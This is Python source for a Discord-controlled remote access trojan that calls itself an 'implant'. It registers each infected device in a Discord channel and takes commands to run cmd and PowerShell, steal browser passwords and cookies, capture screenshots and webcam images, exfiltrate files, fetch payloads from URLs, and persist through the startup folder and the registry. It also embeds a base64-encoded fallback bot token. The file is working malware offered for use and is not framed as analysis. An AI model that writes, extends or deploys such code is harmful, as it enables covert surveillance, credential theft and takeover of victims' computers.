import discord
from discord import File, Embed
import os
import socket
import asyncio
import shlex
import base64 # Re-imported for fallback token
import sys    # Re-imported for PyInstaller pathing

# Import all execution modules
import command_executor as cmd; import notification_sender as notifier; import screenshot_taker as ss
import system_info as sysinfo; import web_opener; import startup_manager
import webcam_manager as wcm; import file_explorer as fe; import persistence_manager as pm
import file_transfer_manager as ftm
import stealer # Your stealer module

# --- Configuration ---
TOKEN_FILE_NAME = 'token.txt' # The name of the external token file
SERVER_CATEGORY_NAME = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'
EMBED_COLOR = 0x2B2D31; DISCORD_FILE_LIMIT = 25 * 1024 * 1024

# The Base64 encoded fallback token. Replace this with your own.
FALLBACK_TOKEN_B64 = "TVRNNU5qVTNOekEyTXpNME1qY3dOalk1T0EuRzhoTjgzLmNDQ1U4bXRQbDVvRC1rUHJ2RWtiR0djY3E2RTM1TklUOTluTHdN"

# --- Bot Setup & Helpers ---
intents = discord.Intents.default(); intents.message_content = True
client = discord.Client(intents=intents)

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def load_token():
    """
    Tries to load the token from token.txt, otherwise uses the hardcoded fallback.
    """
    token_file_path = resource_path(TOKEN_FILE_NAME)
    try:
        # Priority 1: Try to load from the external file.
        with open(token_file_path, 'r') as f:
            token = f.read().strip()
            print(f"Successfully loaded token from {TOKEN_FILE_NAME}.")
            return token
    except FileNotFoundError:
        # Priority 2: If the file doesn't exist, use the fallback.
        print(f"'{TOKEN_FILE_NAME}' not found. Using hardcoded fallback token.")
        try:
            fallback_token = base64.b64decode(FALLBACK_TOKEN_B64).decode('utf-8')
            return fallback_token
        except Exception as e:
            print(f"FATAL ERROR: Could not decode the fallback token. Error: {e}")
            raise

def get_device_name():
    hostname = socket.gethostname(); return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()

# --- Core Events ---
@client.event
async def on_ready():
    print(f'Implant logged in as {client.user} on device {get_device_name()}')
    if not client.guilds: return
    guild = client.guilds[0]; device_name = get_device_name()
    category = discord.utils.get(guild.categories, name=SERVER_CATEGORY_NAME)
    if not category:
        try: category = await guild.create_category(SERVER_CATEGORY_NAME)
        except discord.Forbidden: return
    channel = discord.utils.get(guild.text_channels, name=device_name, category=category)
    if not channel:
        try: channel = await guild.create_text_channel(device_name, category=category)
        except discord.Forbidden: return
    try:
        embed = Embed(title="🟢 New Session Started", description=f"Device **{device_name}** is now online and ready for commands.", color=discord.Color.green())
        await channel.send(embed=embed)
    except discord.Forbidden: pass

@client.event
async def on_message(message):
    device_name = get_device_name()
    # This is the corrected logic from the previous fix.
    if message.channel.name != device_name or not message.content.startswith(INSTRUCTION_PREFIX):
        return

    content = message.content[len(INSTRUCTION_PREFIX):]
    parts = content.split(' ', 1)
    command_name = parts[0]
    args_str = parts[1] if len(parts) > 1 else ""

    try:
        # ... (All command handlers are unchanged) ...
        if command_name == "download":
            file_path=args_str;
            if not os.path.exists(file_path) or not os.path.isfile(file_path):raise FileNotFoundError(f"File not found on implant: {file_path}")
            if os.path.getsize(file_path)>DISCORD_FILE_LIMIT:raise Exception(f"File size exceeds Discord's limit.")
            await message.channel.send(embed=Embed(title=f"📦 Downloading File: `{os.path.basename(file_path)}`",color=EMBED_COLOR),file=File(file_path))
        elif command_name == "upload_url":
            save_path,url=shlex.split(args_str);status=await asyncio.to_thread(ftm.download_from_url,url,save_path);
            await message.channel.send(embed=Embed(title="📥 Upload from URL Status",description=status,color=EMBED_COLOR))
        elif command_name == "upload_attachment":
            if not message.attachments:raise Exception("C2 relay error: No file was attached.")
            attachment=message.attachments[0];await attachment.save(args_str);
            await message.channel.send(embed=Embed(title="📥 Upload from Attachment Status",description=f"✅ Saved `{attachment.filename}` to `{args_str}`",color=EMBED_COLOR))
        elif command_name == "stealpasswords":
            data=await asyncio.to_thread(stealer.steal_passwords);
            if not data["passwords"]:raise Exception("No passwords found")
            formatted=stealer.format_results(data["passwords"],"passwords");temp_file="passwords.txt";open(temp_file,"w",encoding="utf-8").write(formatted);
            await message.channel.send(embed=Embed(title="🔑 Retrieved Passwords",color=EMBED_COLOR),file=File(temp_file));os.remove(temp_file)
        elif command_name == "stealcookies":
            data=await asyncio.to_thread(stealer.steal_passwords);
            if not data["cookies"]:raise Exception("No cookies found")
            formatted=stealer.format_results(data["cookies"],"cookies");temp_file="cookies.txt";open(temp_file,"w",encoding="utf-8").write(formatted);
            await message.channel.send(embed=Embed(title="🍪 Retrieved Cookies",color=EMBED_COLOR),file=File(temp_file));os.remove(temp_file)
        elif command_name == "kill":
            await message.channel.send(embed=Embed(title="🔴 Session Terminated",description=f"Device **{device_name}** has been shut down.",color=discord.Color.red()));await client.close()
        elif command_name == "runcmd":
            output=cmd.execute_command(args_str);await message.channel.send(embed=Embed(title="📟 CMD Output",description=f"```cmd\n{output[:1980]}\n```",color=EMBED_COLOR))
        elif command_name == "runpw":
            output=cmd.execute_powershell(args_str);await message.channel.send(embed=Embed(title=" PowerShell Output",description=f"```powershell\n{output[:1980]}\n```",color=EMBED_COLOR))
        elif command_name == "takescreenshot":
            ss_file=ss.take_screenshot()
            if ss_file and os.path.exists(ss_file):
                embed=Embed(title="📸 Screenshot Captured",color=EMBED_COLOR);f=File(ss_file,filename="screenshot.png");embed.set_image(url="attachment://screenshot.png");
                await message.channel.send(file=f,embed=embed);os.remove(ss_file)
            else:raise Exception("Failed to create screenshot file.")
        elif command_name == "irlpicture":
            img_path=await asyncio.to_thread(wcm.capture_webcam_image)
            if img_path and os.path.exists(img_path):
                embed=Embed(title="📷 Webcam Image Captured",color=EMBED_COLOR);f=File(img_path,filename="webcam.png");embed.set_image(url="attachment://webcam.png");
                await message.channel.send(file=f,embed=embed);os.remove(img_path)
            else:raise Exception("Failed to capture webcam image.")
        elif command_name == "systemspecs":
            specs=sysinfo.get_specs();embed=Embed(title=f"💻 System Specs for {device_name}",color=discord.Color.blue());
            embed.add_field(name="OS",value=f"{specs.get('platform','N/A')} {specs.get('platform_release','N/A')}",inline=False);embed.add_field(name="CPU",value=f"{specs.get('cpu_name','N/A')}",inline=False);embed.add_field(name="RAM",value=f"{specs.get('ram_usage_percent','N/A')}% used",inline=False);
            await message.channel.send(embed=embed)
        elif command_name == "shownotification":
            t,m=shlex.split(args_str);s=notifier.show(t,m);msg="Success"if s else"Failure";
            await message.channel.send(embed=Embed(title="🖥️ Notification Status",description=msg,color=discord.Color.green()if s else discord.Color.orange()))
        elif command_name == "openwebsite":
            s=web_opener.open_url(args_str);msg=f"Success opening `{args_str}`."if s else f"Failure opening `{args_str}`.";
            await message.channel.send(embed=Embed(title="🌐 Open URL Status",description=msg,color=discord.Color.green()if s else discord.Color.orange()))
        elif command_name == "putinstartup":
            status=startup_manager.add_to_startup();await message.channel.send(embed=Embed(title="⚙️ Startup Folder Status",description=f"`{status}`",color=EMBED_COLOR))
        elif command_name == "persist":
            status=pm.add_to_registry(args_str);await message.channel.send(embed=Embed(title="⚙️ Registry Persistence Status",description=f"`{status}`",color=EMBED_COLOR))
        elif command_name == "explore":
            await message.channel.send(embed=fe.create_explorer_embed(args_str))
        
    except Exception as e:
        await message.channel.send(embed=Embed(title="❌ Implant Error",description=f"On `{device_name}`:\n```py\n{e}\n```",color=discord.Color.red()))

# --- Main Execution ---
if __name__ == "__main__":
    try: client.run(load_token())
    except Exception as e: print(f"Failed to start implant: {e}")